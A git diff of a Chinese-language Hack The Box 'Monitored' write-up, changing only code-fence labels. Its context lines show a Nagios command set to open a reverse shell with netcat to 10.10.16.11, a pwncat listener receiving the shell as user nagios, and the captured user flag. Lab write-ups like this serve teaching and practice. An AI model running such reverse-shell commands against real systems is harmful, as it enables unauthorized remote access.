@@ -64,7 +64,7 @@ Configure ->  Commands ->  Add New
 
 加上一个反向 shell 的命令
 
-```shell
+```bash
 nc -e /bin/bash 10.10.16.11 9999
 ```
 
@@ -86,7 +86,7 @@ Monitoring -> Services -> Add New
 
 成功得到反弹shell
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/Hackthebox-Monitored]
 └──╼ $pwncat-cs -lp 9999
 [13:07:28] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
@@ -100,7 +100,7 @@ nagios
 
 ## user pwned
 
-```shell
+```bash
 (remote) nagios@monitored:/home/nagios$ cat user.txt 
 5a9412d810390fed6e458fe5dba7bf30
 ```
